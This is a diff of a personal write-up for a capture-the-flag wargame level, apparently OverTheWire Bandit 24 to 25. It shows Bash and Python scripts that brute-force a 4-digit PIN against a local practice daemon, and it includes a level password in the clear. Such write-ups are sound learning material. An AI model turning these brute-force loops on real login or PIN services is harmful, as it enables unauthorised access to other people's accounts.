@@ -1,83 +1,118 @@
 # Bandit Level 24 → Level 25
 
-## 🎯 Objective
+##  Goal
 
-Find the password for the next level. A password-checking service is running on **localhost port 30002**. It requires the current Bandit 24 password and a **4-digit PIN**.
+A daemon is listening on port `30002`. It gives the password for **Bandit Level 25** when given:
 
-##  Understand the Service
+1. The password for **Bandit Level 24**
+2. A secret **4-digit PIN**
 
-The service requires input in this format:
+The PIN cannot be retrieved directly, so I need to try all **10,000 possible combinations** from `0000` to `9999`. This is called **brute-forcing**.
+
+The challenge also says that I do not need to create a new connection for every attempt, so I can use a single TCP connection and send all PIN attempts through it.
+
+##  Connecting to the Daemon
+
+First, I connected to the service running on port `30002` using `nc`:
+
+```bash
+nc localhost 30002
+```
+
+The server displayed:
 
 ```text
-<password> <4-digit PIN>
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
 ```
 
-I already had the password for `bandit24`:
+I tested the password with the PIN `0000`:
 
 ```text
-hVQMk***********m7BOgVXv
+hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0000
 ```
 
-Since the PIN can be anything from `0000` to `9999`, there are **10,000 possible combinations**.
-
-##  Create a Brute-Force Script
-
-I created a Bash script:
-
-```bash
-nano /tmp/brute.sh
-```
-
-The script generates every possible PIN and sends it to the service:
-
-```bash
-#!/bin/bash
-
-password="hVQMk3_lvl_24_pass_VXv"
-
-for pin in $(seq -w 0000 9999); do
-    echo "$password $pin"
-done | nc localhost 30002
-```
-
-I made the script executable:
-
-```bash
-chmod +x /tmp/brute.sh
-```
-
-Then I ran it:
-
-```bash
-./brute.sh
-```
-
-The script tried all 10,000 possible PINs. Most attempts returned:
+The server responded:
 
 ```text
-Wrong! Please enter the correct current password and pincode.
+Wrong! Please enter the correct current password and pincode. Try again.
 ```
 
-Eventually, the correct PIN was found:
+This confirmed that the password was correct but the PIN `0000` was not.
+
+##  Understanding Brute Force
+
+There are 10,000 possible 4-digit PINs:
 
 ```text
-Correct!
+0000
+0001
+0002
+0003
+...
+9999
 ```
 
-The service then returned the password for **Bandit Level 25**.
+Instead of manually entering every PIN, I created a Python script to automatically try every combination.
 
-To hide the failed attempts and show only the successful result, I used:
+##  Creating the Brute-Force Script
+
+I created a Python file:
 
 ```bash
-./brute.sh | grep -v "Wrong"
+nano /tmp/brute.py
 ```
 
-## 🧠 What I Learned
+The script was:
 
-* How to connect to a local TCP service using `nc`.
-* How to generate a range of numbers using `seq`.
-* How to use a Bash `for` loop for automation.
-* How to perform a controlled brute-force attack against a CTF service.
-* How to filter command output using `grep`.
+```python
+import socket
+
+password = "hVQMk3_Lvl_24_pass_Xv"
+
+s = socket.socket()
+s.connect(("localhost", 30002))
+
+welcome = s.recv(1024).decode()
+print(welcome)
+
+for pin in range(10000):
+    code = f"{pin:04d}"
+    message = f"{password} {code}\n"
+
+    s.sendall(message.encode())
+
+    response = s.recv(1024).decode()
+
+    if "Wrong!" not in response:
+        print("Correct PIN:", code)
+        print(response)
+        break
+
+    print(f"Tried {code}")
+
+s.close()
+```
+
+
+
+The daemon then gave me the password for **Bandit Level 25**:
+
+```text
+SoHfqMOEqIX2IYK**************jx4P
+```
+
+
+
+##  What I Learned
+
+* **Brute force** means systematically trying all possible values until the correct one is found.
+* A 4-digit PIN has **10,000 possible combinations**, from `0000` to `9999`.
+* Python's `socket` module can communicate with a network service.
+* `socket.connect()` creates the TCP connection.
+* `sendall()` sends data through the connection.
+* `recv()` receives data from the server.
+* `f"{pin:04d}"` formats a number as a 4-digit PIN.
+* I learned how to automate repeated network requests using Python.
+* The challenge specifically taught me that I can maintain **one connection** and send multiple PIN attempts through it instead of reconnecting every time.
 
 
